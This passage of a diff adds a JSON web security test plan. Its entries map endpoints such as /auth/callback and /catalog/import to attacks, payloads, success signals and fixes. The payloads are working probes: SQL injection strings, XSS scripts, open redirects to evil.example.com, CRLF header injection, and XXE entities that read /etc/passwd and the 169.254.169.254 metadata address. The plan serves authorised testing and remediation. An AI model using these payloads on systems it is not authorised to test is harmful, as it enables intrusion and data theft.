+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "code",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "next",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "next",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "next",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "open_redirect",
+      "attack_name": "Open redirect",
+      "category": "validation",
+      "owasp": "A01:2021 Broken Access Control / WSTG-CLNT-04",
+      "severity": "medium",
+      "payloads": [
+        "//evil.example.com",
+        "https://evil.example.com",
+        "/\\evil.example.com",
+        "https:evil.example.com",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "A 3xx response whose Location header points at evil.example.com.",
+      "remediation": "Redirect only to a relative path or an allow-listed host."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "next",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "header_crlf",
+      "attack_name": "HTTP header / CRLF injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-16",
+      "severity": "medium",
+      "payloads": [
+        "%0d%0aX-Injected:%201",
+        "%0d%0aSet-Cookie:%20injected=1",
+        "\r\nX-Injected: 1"
+      ],
+      "positive_signal": "The injected header (X-Injected, Set-Cookie) appears in the response headers.",
+      "remediation": "Strip CR and LF from anything written into a header."
+    },
+    {
+      "endpoint": "/catalog/import",
+      "method": "POST",
+      "param": "<xml body>",
+      "param_in": "body",
+      "param_type": "xml",
+      "attack": "xxe",
+      "attack_name": "XML external entity",
+      "category": "injection",
+      "owasp": "A05:2021 Security Misconfiguration / WSTG-INPV-07",
+      "severity": "high",
+      "payloads": [
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/\">]><r>&x;</r>"
+      ],
+      "positive_signal": "File contents (root:x:0:0) or an internal response reflected back inside the parsed XML.",
+      "remediation": "Disable external entity and DTD processing in the XML parser."
+    }
+  ]
+}
